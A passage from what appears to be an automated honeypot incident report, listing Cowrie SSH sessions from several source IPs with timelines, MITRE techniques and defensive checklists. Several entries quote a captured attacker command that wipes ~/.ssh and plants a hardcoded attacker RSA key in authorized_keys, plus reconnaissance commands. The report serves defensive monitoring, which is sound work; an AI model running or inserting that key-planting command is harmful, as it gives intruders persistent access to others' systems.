| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:31:40` | `cowrie.session.connect` |
| `2026-06-11 20:31:40` | `cowrie.client.version` |
| `2026-06-11 20:31:40` | `cowrie.client.kex` |
| `2026-06-11 20:31:41` | `cowrie.login.success` |
| `2026-06-11 20:31:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7aa158b691df

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-06-11 20:33 |
| **Last Seen** | 2026-06-11 20:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:33:31` | `cowrie.session.connect` |
| `2026-06-11 20:33:31` | `cowrie.client.version` |
| `2026-06-11 20:33:31` | `cowrie.client.kex` |
| `2026-06-11 20:33:31` | `cowrie.login.success` |
| `2026-06-11 20:33:32` | `cowrie.session.params` |
| `2026-06-11 20:33:32` | `cowrie.command.input` |
| `2026-06-11 20:33:32` | `cowrie.command.failed` |
| `2026-06-11 20:33:32` | `cowrie.log.closed` |
| `2026-06-11 20:33:32` | `cowrie.session.params` |
| `2026-06-11 20:33:32` | `cowrie.command.input` |
| `2026-06-11 20:33:32` | `cowrie.session.file_download` |
| `2026-06-11 20:33:32` | `cowrie.log.closed` |
| `2026-06-11 20:33:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1722f9aafb6f

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-06-11 20:33 |
| **Last Seen** | 2026-06-11 20:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:33:34` | `cowrie.session.connect` |
| `2026-06-11 20:33:34` | `cowrie.client.version` |
| `2026-06-11 20:33:35` | `cowrie.client.kex` |
| `2026-06-11 20:33:35` | `cowrie.login.success` |
| `2026-06-11 20:33:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-436eac1dbdb0

| Field | Detail |
|---|---|
| **Source IP** | `170.80.65[.]140` |
| **First Seen** | 2026-06-11 20:33 |
| **Last Seen** | 2026-06-11 20:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:33:39` | `cowrie.session.connect` |
| `2026-06-11 20:33:39` | `cowrie.client.version` |
| `2026-06-11 20:33:40` | `cowrie.client.kex` |
| `2026-06-11 20:33:41` | `cowrie.login.success` |
| `2026-06-11 20:33:42` | `cowrie.session.params` |
| `2026-06-11 20:33:42` | `cowrie.command.input` |
| `2026-06-11 20:33:42` | `cowrie.command.failed` |
| `2026-06-11 20:33:43` | `cowrie.log.closed` |
| `2026-06-11 20:33:43` | `cowrie.session.params` |
| `2026-06-11 20:33:43` | `cowrie.command.input` |
| `2026-06-11 20:33:43` | `cowrie.session.file_download` |
| `2026-06-11 20:33:43` | `cowrie.log.closed` |
| `2026-06-11 20:33:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.80.65[.]140` to AbuseIPDB if not already reported
- [ ] Block `170.80.65[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd6b52e1a86e

| Field | Detail |
|---|---|
| **Source IP** | `170.80.65[.]140` |
| **First Seen** | 2026-06-11 20:33 |
| **Last Seen** | 2026-06-11 20:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:33:47` | `cowrie.session.connect` |
| `2026-06-11 20:33:47` | `cowrie.client.version` |
| `2026-06-11 20:33:47` | `cowrie.client.kex` |
| `2026-06-11 20:33:49` | `cowrie.login.success` |
| `2026-06-11 20:33:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.80.65[.]140` to AbuseIPDB if not already reported
- [ ] Block `170.80.65[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4de6758717e

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-06-11 20:34 |
| **Last Seen** | 2026-06-11 20:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:34:28` | `cowrie.session.connect` |
| `2026-06-11 20:34:28` | `cowrie.client.version` |
| `2026-06-11 20:34:29` | `cowrie.client.kex` |
| `2026-06-11 20:34:29` | `cowrie.login.success` |
| `2026-06-11 20:34:30` | `cowrie.session.params` |
| `2026-06-11 20:34:30` | `cowrie.command.input` |
| `2026-06-11 20:34:30` | `cowrie.command.failed` |
| `2026-06-11 20:34:30` | `cowrie.log.closed` |
| `2026-06-11 20:34:30` | `cowrie.session.params` |
| `2026-06-11 20:34:30` | `cowrie.command.input` |
| `2026-06-11 20:34:30` | `cowrie.session.file_download` |
| `2026-06-11 20:34:30` | `cowrie.log.closed` |
| `2026-06-11 20:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-195b9177e882

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-06-11 20:34 |
| **Last Seen** | 2026-06-11 20:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:34:32` | `cowrie.session.connect` |
| `2026-06-11 20:34:32` | `cowrie.client.version` |
| `2026-06-11 20:34:32` | `cowrie.client.kex` |
| `2026-06-11 20:34:33` | `cowrie.login.success` |
| `2026-06-11 20:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99c878b6700e

| Field | Detail |
|---|---|
| **Source IP** | `170.80.65[.]140` |
| **First Seen** | 2026-06-11 20:37 |
| **Last Seen** | 2026-06-11 20:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:37:55` | `cowrie.session.connect` |
| `2026-06-11 20:37:55` | `cowrie.client.version` |
| `2026-06-11 20:37:56` | `cowrie.client.kex` |
| `2026-06-11 20:37:57` | `cowrie.login.success` |
| `2026-06-11 20:37:58` | `cowrie.session.params` |
| `2026-06-11 20:37:58` | `cowrie.command.input` |
| `2026-06-11 20:37:58` | `cowrie.command.failed` |
| `2026-06-11 20:37:59` | `cowrie.log.closed` |
| `2026-06-11 20:37:59` | `cowrie.session.params` |
| `2026-06-11 20:37:59` | `cowrie.command.input` |
| `2026-06-11 20:37:59` | `cowrie.session.file_download` |
| `2026-06-11 20:37:59` | `cowrie.log.closed` |
| `2026-06-11 20:38:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.80.65[.]140` to AbuseIPDB if not already reported
- [ ] Block `170.80.65[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abc8807cdfba

| Field | Detail |
|---|---|
| **Source IP** | `170.80.65[.]140` |
| **First Seen** | 2026-06-11 20:38 |
| **Last Seen** | 2026-06-11 20:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:38:03` | `cowrie.session.connect` |
| `2026-06-11 20:38:03` | `cowrie.client.version` |
| `2026-06-11 20:38:03` | `cowrie.client.kex` |
| `2026-06-11 20:38:05` | `cowrie.login.success` |
| `2026-06-11 20:38:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.80.65[.]140` to AbuseIPDB if not already reported
- [ ] Block `170.80.65[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7833921bdbd

| Field | Detail |
|---|---|
| **Source IP** | `41.93.28[.]23` |
| **First Seen** | 2026-06-11 20:53 |
| **Last Seen** | 2026-06-11 20:53 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:53:30` | `cowrie.session.connect` |
| `2026-06-11 20:53:30` | `cowrie.client.version` |
| `2026-06-11 20:53:31` | `cowrie.client.kex` |
| `2026-06-11 20:53:32` | `cowrie.login.success` |
| `2026-06-11 20:53:33` | `cowrie.session.params` |
| `2026-06-11 20:53:33` | `cowrie.command.input` |
| `2026-06-11 20:53:33` | `cowrie.command.failed` |
| `2026-06-11 20:53:34` | `cowrie.log.closed` |
| `2026-06-11 20:53:34` | `cowrie.session.params` |
| `2026-06-11 20:53:34` | `cowrie.command.input` |
| `2026-06-11 20:53:34` | `cowrie.session.file_download` |
| `2026-06-11 20:53:34` | `cowrie.log.closed` |
| `2026-06-11 20:53:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.93.28[.]23` to AbuseIPDB if not already reported
- [ ] Block `41.93.28[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe6e84b80e85

| Field | Detail |
|---|---|
| **Source IP** | `41.93.28[.]23` |
| **First Seen** | 2026-06-11 20:53 |
| **Last Seen** | 2026-06-11 20:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:53:38` | `cowrie.session.connect` |
| `2026-06-11 20:53:38` | `cowrie.client.version` |
| `2026-06-11 20:53:39` | `cowrie.client.kex` |
| `2026-06-11 20:53:40` | `cowrie.login.success` |
| `2026-06-11 20:53:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.93.28[.]23` to AbuseIPDB if not already reported
- [ ] Block `41.93.28[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ed7d2cc4d36

| Field | Detail |
|---|---|
| **Source IP** | `41.93.28[.]23` |
| **First Seen** | 2026-06-11 20:56 |
| **Last Seen** | 2026-06-11 20:56 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:56:09` | `cowrie.session.connect` |
| `2026-06-11 20:56:09` | `cowrie.client.version` |
| `2026-06-11 20:56:09` | `cowrie.client.kex` |
| `2026-06-11 20:56:11` | `cowrie.login.success` |
| `2026-06-11 20:56:11` | `cowrie.session.params` |
| `2026-06-11 20:56:11` | `cowrie.command.input` |
| `2026-06-11 20:56:11` | `cowrie.command.failed` |
| `2026-06-11 20:56:12` | `cowrie.log.closed` |
| `2026-06-11 20:56:12` | `cowrie.session.params` |
| `2026-06-11 20:56:12` | `cowrie.command.input` |
| `2026-06-11 20:56:13` | `cowrie.session.file_download` |
| `2026-06-11 20:56:13` | `cowrie.log.closed` |
| `2026-06-11 20:56:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.93.28[.]23` to AbuseIPDB if not already reported
- [ ] Block `41.93.28[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7337fd21733

| Field | Detail |
|---|---|
| **Source IP** | `41.93.28[.]23` |
| **First Seen** | 2026-06-11 20:56 |
| **Last Seen** | 2026-06-11 20:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:56:17` | `cowrie.session.connect` |
| `2026-06-11 20:56:17` | `cowrie.client.version` |
| `2026-06-11 20:56:17` | `cowrie.client.kex` |
| `2026-06-11 20:56:20` | `cowrie.login.success` |
| `2026-06-11 20:56:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.93.28[.]23` to AbuseIPDB if not already reported
- [ ] Block `41.93.28[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec8e83703a9c

| Field | Detail |
|---|---|
| **Source IP** | `41.93.28[.]23` |
| **First Seen** | 2026-06-11 20:58 |
| **Last Seen** | 2026-06-11 20:58 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:58:44` | `cowrie.session.connect` |
| `2026-06-11 20:58:44` | `cowrie.client.version` |
| `2026-06-11 20:58:44` | `cowrie.client.kex` |
| `2026-06-11 20:58:45` | `cowrie.login.success` |
| `2026-06-11 20:58:46` | `cowrie.session.params` |
| `2026-06-11 20:58:46` | `cowrie.command.input` |
| `2026-06-11 20:58:46` | `cowrie.command.failed` |
| `2026-06-11 20:58:47` | `cowrie.log.closed` |
| `2026-06-11 20:58:47` | `cowrie.session.params` |
| `2026-06-11 20:58:47` | `cowrie.command.input` |
| `2026-06-11 20:58:48` | `cowrie.session.file_download` |
| `2026-06-11 20:58:48` | `cowrie.log.closed` |
| `2026-06-11 20:58:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.93.28[.]23` to AbuseIPDB if not already reported
- [ ] Block `41.93.28[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a70f1274b074

| Field | Detail |
|---|---|
| **Source IP** | `41.93.28[.]23` |
| **First Seen** | 2026-06-11 20:58 |
| **Last Seen** | 2026-06-11 20:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:58:52` | `cowrie.session.connect` |
| `2026-06-11 20:58:52` | `cowrie.client.version` |
| `2026-06-11 20:58:52` | `cowrie.client.kex` |
| `2026-06-11 20:58:54` | `cowrie.login.success` |
| `2026-06-11 20:58:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.93.28[.]23` to AbuseIPDB if not already reported
- [ ] Block `41.93.28[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed69afb75c20

| Field | Detail |
|---|---|
| **Source IP** | `14.103.121[.]78` |
| **First Seen** | 2026-06-11 21:00 |
| **Last Seen** | 2026-06-11 21:01 |
| **Session Duration** | 48s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}', ls -lh $(which ls)` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 21:00:55` | `cowrie.session.connect` |
| `2026-06-11 21:00:55` | `cowrie.client.version` |
| `2026-06-11 21:00:56` | `cowrie.client.kex` |
| `2026-06-11 21:00:56` | `cowrie.login.success` |
| `2026-06-11 21:00:57` | `cowrie.session.params` |
| `2026-06-11 21:00:57` | `cowrie.command.input` |
| `2026-06-11 21:00:57` | `cowrie.command.failed` |
| `2026-06-11 21:00:57` | `cowrie.log.closed` |
| `2026-06-11 21:00:58` | `cowrie.session.params` |
| `2026-06-11 21:00:58` | `cowrie.command.input` |
| `2026-06-11 21:00:58` | `cowrie.session.file_download` |
| `2026-06-11 21:00:58` | `cowrie.log.closed` |
| `2026-06-11 21:01:15` | `cowrie.session.params` |
| `2026-06-11 21:01:15` | `cowrie.command.input` |
| `2026-06-11 21:01:39` | `cowrie.log.closed` |
| `2026-06-11 21:01:39` | `cowrie.session.params` |
| `2026-06-11 21:01:39` | `cowrie.command.input` |
| `2026-06-11 21:01:40` | `cowrie.log.closed` |
| `2026-06-11 21:01:40` | `cowrie.session.params` |
| `2026-06-11 21:01:40` | `cowrie.command.input` |
| `2026-06-11 21:01:40` | `cowrie.command.input` |
| `2026-06-11 21:01:40` | `cowrie.log.closed` |
| `2026-06-11 21:01:40` | `cowrie.session.params` |
| `2026-06-11 21:01:40` | `cowrie.command.input` |
| `2026-06-11 21:01:40` | `cowrie.log.closed` |
| `2026-06-11 21:01:41` | `cowrie.session.params` |
| `2026-06-11 21:01:41` | `cowrie.command.input` |
| `2026-06-11 21:01:41` | `cowrie.log.closed` |
| `2026-06-11 21:01:41` | `cowrie.session.params` |
| `2026-06-11 21:01:41` | `cowrie.command.input` |
| `2026-06-11 21:01:41` | `cowrie.log.closed` |
| `2026-06-11 21:01:42` | `cowrie.session.params` |
| `2026-06-11 21:01:42` | `cowrie.command.input` |
| `2026-06-11 21:01:42` | `cowrie.log.closed` |
| `2026-06-11 21:01:42` | `cowrie.session.params` |
| `2026-06-11 21:01:42` | `cowrie.command.input` |
| `2026-06-11 21:01:42` | `cowrie.log.closed` |
| `2026-06-11 21:01:42` | `cowrie.session.params` |
| `2026-06-11 21:01:42` | `cowrie.command.input` |
| `2026-06-11 21:01:43` | `cowrie.log.closed` |
| `2026-06-11 21:01:43` | `cowrie.session.params` |
| `2026-06-11 21:01:43` | `cowrie.command.input` |
| `2026-06-11 21:01:43` | `cowrie.log.closed` |
| `2026-06-11 21:01:43` | `cowrie.session.params` |
| `2026-06-11 21:01:43` | `cowrie.command.input` |
| `2026-06-11 21:01:44` | `cowrie.log.closed` |
| `2026-06-11 21:01:44` | `cowrie.session.params` |
| `2026-06-11 21:01:44` | `cowrie.command.input` |
